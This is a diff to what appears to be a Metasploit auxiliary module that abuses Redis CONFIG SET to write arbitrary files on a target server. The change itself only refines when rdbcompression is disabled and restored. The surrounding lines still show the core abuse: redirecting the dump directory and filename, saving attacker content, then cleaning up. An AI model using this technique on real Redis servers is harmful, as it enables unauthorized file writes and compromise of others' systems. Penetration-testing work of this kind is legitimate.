@@ -56,7 +56,9 @@ class Metasploit3 < Msf::Auxiliary
     # XXX: this is a hack -- we should really parse the responses more correctly
     original_dir = redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
     original_dbfilename = redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last
-    original_rdbcompression = redis_command('CONFIG', 'GET', 'rdbcompression').split(/\r\n/).last
+    if datastore['DISABLE_RDBCOMPRESSION']
+      original_rdbcompression = redis_command('CONFIG', 'GET', 'rdbcompression').split(/\r\n/).last
+    end
 
     # set the directory which stores the current redis local store
     data = redis_command('CONFIG', 'SET', 'dir', dirname)
@@ -73,7 +75,12 @@ class Metasploit3 < Msf::Auxiliary
     # keys.
     if datastore['DISABLE_RDBCOMPRESSION'] && original_rdbcompression.upcase == 'YES'
       data = redis_command('CONFIG', 'SET', 'rdbcompression', 'no')
-      print_error("#{peer} -- Unable to disable rdbcompresssion") unless data.include?('+OK')
+      if data.include?('+OK')
+        reset_rdbcompression = true
+      else
+        print_error("#{peer} -- Unable to disable rdbcompresssion")
+        reset_rdbcompression = false
+      end
     end
 
     # set a key in this db that contains our content
@@ -96,7 +103,9 @@ class Metasploit3 < Msf::Auxiliary
     # XXX: ensure that these get sent if we prematurely return if a previous command fails
     redis_command('CONFIG', 'SET', 'dir', original_dir)
     redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)
-    redis_command('CONFIG', 'SET', 'rdbcompression', original_rdbcompression)
+    if datastore['DISABLE_RDBCOMPRESSION'] && reset_rdbcompression
+      redis_command('CONFIG', 'SET', 'rdbcompression', original_rdbcompression)
+    end
     redis_command('DEL', key)
     redis_command('SAVE')
   end
